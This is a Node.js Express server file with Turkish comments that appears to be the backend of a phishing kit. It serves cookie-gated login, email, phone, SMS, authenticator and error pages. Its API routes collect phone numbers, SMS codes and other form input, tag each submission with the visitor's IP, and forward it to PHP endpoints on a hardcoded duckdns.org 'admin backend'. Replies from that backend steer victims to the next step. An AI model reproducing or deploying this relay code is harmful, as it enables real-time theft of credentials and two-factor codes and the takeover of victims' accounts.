// server.js (veya index.js)
const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const path = require('path');
const requestIp = require('request-ip');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cookieParser());
app.use(requestIp.mw());

// ==== AYARLAR ====
// Vercel/çevrede kolayca değişsin diye BASE URL'i .env ile yönetiyoruz.
const ADMIN_BASE =
  (process.env.ADMIN_BASE && process.env.ADMIN_BASE.trim()) ||
  'https://99990005558899.duckdns.org';

const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

// statik dosyalar
app.use(express.static(path.join(__dirname, 'public')));

// ortak yardımcı – yol birleştir, slash'ları düzgünleştir
const makeUrl = (p) =>
  `${ADMIN_BASE.replace(/\/$/, '')}/${String(p).replace(/^\//, '')}`;

const postTo = (endpoint, data) =>
  axios.post(makeUrl(endpoint), data, { timeout: 15000 });

// routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// === API: eski->yeni domain ===
// Hepsi yeni domain'e gider (ADMIN_BASE).

// 1) livechats.php (apitr)
app.post('/apitr', async (req, res) => {
  const clientIp = req.clientIp;
  const { action, phoneinput, ...otherData } = req.body;

  try {
    const postData = {
      ip: clientIp,
      action,
      ...(phoneinput && { phoneinput }),
      ...otherData,
    };

    const response = await postTo('livechats.php', postData);
    res.send(response.data);
  } catch (err) {
    console.error('apitr error:', err?.response?.data || err.message);
    res.status(500).send('Sunucu hatası, lütfen daha sonra tekrar deneyin.');
  }
});

// 2) livechats.php (api2)
app.post('/api2', async (req, res) => {
  const clientIp = req.clientIp;
  const { action, phoneinput, ...otherData } = req.body;

  try {
    const postData = {
      ip: clientIp,
      action,
      ...(phoneinput && { phoneinput }),
      ...otherData,
    };

    const response = await postTo('livechats.php', postData);
    res.send(response.data);
  } catch (err) {
    console.error('api2 error:', err?.response?.data || err.message);
    res.status(500).send('Sunucu hatası, lütfen daha sonra tekrar deneyin.');
  }
});

// 3) verify -> eksik.php
app.get('/verify', async (req, res) => {
  const clientIp = req.clientIp;

  try {
    const response = await postTo('eksik.php', { ip: clientIp });

    if (response.data === '/control.html?page=eposta') {
      return res.redirect('/eposta');
    } else if (response.data === '/control.html?page=telno') {
      return res.redirect('/phone');
    }

    res.sendFile(path.join(__dirname, 'public', 'bekle.html'));
  } catch (err) {
    console.error('verify error:', err?.response?.data || err.message);
    res.sendFile(path.join(__dirname, 'public', 'bekle.html'));
  }
});

// 4) livechat.php
app.post('/api', async (req, res) => {
  const clientIp = req.clientIp;
  const { x } = req.body;

  try {
    const response = await postTo('livechat.php', { ip: clientIp, x });
    res.send(response.data);
  } catch (err) {
    console.error('api/livechat error:', err?.response?.data || err.message);
    res.status(500).send('Sunucu hatası, lütfen daha sonra tekrar deneyin.');
  }
});

// 5) sms.php
app.post('/sms', async (req, res) => {
  const clientIp = req.clientIp;
  const { sms } = req.body;

  try {
    const response = await postTo('sms.php', { ip: clientIp, sms });
    res.send(response.data);
  } catch (err) {
    console.error('sms error:', err?.response?.data || err.message);
    res.status(500).send('Sunucu hatası, lütfen daha sonra tekrar deneyin.');
  }
});

// 6) livechats.php (livechats)
app.post('/livechats', async (req, res) => {
  const clientIp = req.clientIp;
  const { action, phoneinput, ...otherData } = req.body;

  try {
    const postData = {
      ip: clientIp,
      action,
      ...(phoneinput && { phoneinput }),
      ...otherData,
    };

    const response = await postTo('livechats.php', postData);
    res.send(response.data);
  } catch (err) {
    console.error('livechats error:', err?.response?.data || err.message);
    res.status(500).send('Sunucu hatası, lütfen daha sonra tekrar deneyin.');
  }
});

// 7) phone.php
app.post('/livechatss', async (req, res) => {
  const clientIp = req.clientIp;
  const { phone2 } = req.body;

  try {
    const response = await postTo('phone.php', { ip: clientIp, phone2 });
    res.send(response.data);
  } catch (err) {
    console.error('livechatss error:', err?.response?.data || err.message);
    res.status(500).send('Sunucu hatası, lütfen daha sonra tekrar deneyin.');
  }
});

// --- sayfalar (cookieler kontrol) ---
const needCookie = (req, res, next) => {
  const caAsCookie = req.cookies.ca_as;
  if (!caAsCookie) return res.redirect('/');
  next();
};

app.get('/login', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'home.html'))
);
app.get('/bekle', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'bekle.html'))
);
app.get('/eposta', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'eposta.html'))
);
app.get('/phone', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'phone.html'))
);
app.get('/sms', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'sms.html'))
);
app.get('/mail', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'mail.html'))
);
app.get('/email-error', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'email-error.html'))
);
app.get('/password-error', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'password-error.html'))
);
app.get('/sms-error', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'sms-error.html'))
);
app.get('/control.php?page=telefonHata', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'sms-error.html'))
);
app.get('/authenticator', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'authenticator.html'))
);
app.get('/error-number', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'error-number.html'))
);
app.get('/successfuly', needCookie, (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'basarili.html'))
);

// Tek bir listen!
app.listen(port, () => {
  console.log(
    `Web sunucusu http://localhost:${port} üzerinde ve admin backend: ${ADMIN_BASE}`
  );
});
